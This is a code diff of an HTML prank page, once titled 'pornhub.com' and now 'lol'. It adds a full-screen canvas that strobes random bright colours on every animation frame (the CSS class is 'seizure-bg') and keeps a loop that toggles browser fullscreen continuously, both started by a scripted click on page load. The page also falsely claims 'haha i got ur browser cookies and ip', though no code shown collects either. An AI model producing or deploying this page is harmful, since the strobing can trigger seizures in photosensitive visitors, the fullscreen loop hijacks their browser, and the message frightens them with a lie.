@@ -3,59 +3,90 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>pornhub.com</title>
+  <title>lol</title>
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
     html, body {
       height: 100%;
-      background: #000;
-      color: #0f0;
-      font-family: 'Courier New', monospace;
       overflow: hidden;
     }
     .container {
-      height: 100vh;
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
       display: flex;
       align-items: center;
       justify-content: center;
       text-align: center;
-      padding: 20px;
+      z-index: 10;
+      pointer-events: none;
     }
     h1 {
-      font-size: 3.5rem;
-      text-transform: uppercase;
-      letter-spacing: 4px;
-      text-shadow: 0 0 10px #0f0, 0 0 20px #0f0;
-      animation: pulse 1.5s infinite;
-    }
-    @keyframes pulse {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.7; }
+      font-family: Arial, sans-serif;
+      font-size: 3rem;
+      color: #000;
+      letter-spacing: 3px;
+      font-weight: bold;
     }
     @media (max-width: 768px) {
-      h1 { font-size: 2rem; }
+      h1 { font-size: 1.8rem; }
+    }
+    .seizure-bg {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      pointer-events: none;
     }
   </style>
 </head>
 <body>
+
+  
+  <canvas class="seizure-bg" id="bg"></canvas>
+
+  
   <div class="container">
     <h1>haha i got ur browser cookies and ip</h1>
   </div>
 
   <script>
     
-    function startFullscreenChaos() {
+    const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#00ffff', '#ff00ff', '#ffffff', '#000000'];
+    const canvas = document.getElementById('bg');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    function flash() {
+      ctx.fillStyle = colors[Math.floor(Math.random() * colors.length)];
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      requestAnimationFrame(flash);
+    }
+    flash();
+
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+
+    
+    setTimeout(() => {
+      document.body.click();
+    }, 300);
+
+    document.addEventListener('click', function startChaos() {
       let isFullscreen = false;
-      let lastTime = 0;
+      let last = 0;
 
       function toggle() {
-        const now = performance.now();
-        if (now - lastTime < 10) return requestAnimationFrame(toggle);
-        lastTime = now;
+        const now = Date.now();
+        if (now - last < 10) {
+          requestAnimationFrame(toggle);
+          return;
+        }
+        last = now;
 
         const el = document.documentElement;
-        const exit = document.exitFullscreen || document.webkitExitFullscreen || document.mozCancelFullScreen || document.msExitFullscreen;
         const enter = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
+        const exit = document.exitFullscreen || document.webkitExitFullscreen || document.mozCancelFullScreen || document.msExitFullscreen;
 
         if (!isFullscreen && enter) {
           enter.call(el).catch(() => {});
@@ -63,22 +94,11 @@
           exit.call(document).catch(() => {});
         }
         isFullscreen = !isFullscreen;
+
         requestAnimationFrame(toggle);
       }
-
       toggle();
-    }
-
-    
-    setTimeout(() => {
-      if (document.fullscreenElement) return;
-      document.body.click();
-    }, 1000);
-
-    
-    document.addEventListener('click', startFullscreenChaos, { once: true });
-    document.addEventListener('touchstart', startFullscreenChaos, { once: true });
-    document.addEventListener('keydown', startFullscreenChaos, { once: true });
+    }, { once: true });
   </script>
 </body>
 </html>
